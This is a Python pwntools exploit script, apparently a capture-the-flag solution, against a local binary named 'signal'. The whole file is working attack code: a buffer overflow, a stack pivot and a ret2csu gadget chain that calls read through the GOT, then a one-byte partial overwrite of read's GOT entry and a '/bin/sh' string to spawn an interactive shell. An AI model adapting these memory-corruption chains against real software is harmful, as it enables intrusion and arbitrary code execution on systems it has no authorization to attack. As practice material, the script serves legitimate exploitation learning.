#!/usr/bin/python

from pwn import *

def call_ptr(target,edi,rsi,rdx,rbx_after=0,rbp_after=0,r12_after=0,r13_after=0,r14_after=0,r15_after=0):
	payload = p64(0x40074a)
	payload += p64(0)
	payload += p64(1)
	payload += p64(target)
	payload += p64(edi)
	payload += p64(rsi)
	payload += p64(rdx)
	payload += p64(0x400730)
	payload += p64(0)
	payload += p64(rbx_after)
	payload += p64(rbp_after)
	payload += p64(r12_after)
	payload += p64(r13_after)
	payload += p64(r14_after)
	payload += p64(r15_after)
	return payload

def exploit():
    payload = 'a'*0x100
    payload += p64(0x601510)
    payload += call_ptr(exe.got["read"],0,0x601518,0x300,rbp_after=0x601510)
    payload += p64(0x4006e2) # leave; ret
    payload = payload.ljust(0x200,'\x00')
    gdb.attach(r, 'brva *main+65')
    r.send(payload)

    payload = call_ptr(exe.got["read"],0,exe.got["read"],1,rbp_after=0x601590)
    payload += p64(0x4006db) # mov rax, [rbp-0x108]; leave; ret
    payload += call_ptr(exe.got["read"],0,0x601910,15,rbp_after=0x601610)
    payload += p64(exe.plt["read"])
    # frame = SigreturnFrame()
    # frame.rax = 0x3b
    # frame.rdi = 0x601910
    # frame.rsp = 0x601a10
    # frame.rip = exe.plt["read"]
    # payload += str(frame)
    payload = payload.ljust(0x300,'\x00')
    r.send(payload)

    r.send(p8(0x7f))
    r.send("/bin/sh\x00".ljust(15,'\x00'))
    r.interactive()

context.arch = "amd64"
exe = ELF("./signal")

r = process("./signal")

exploit() 
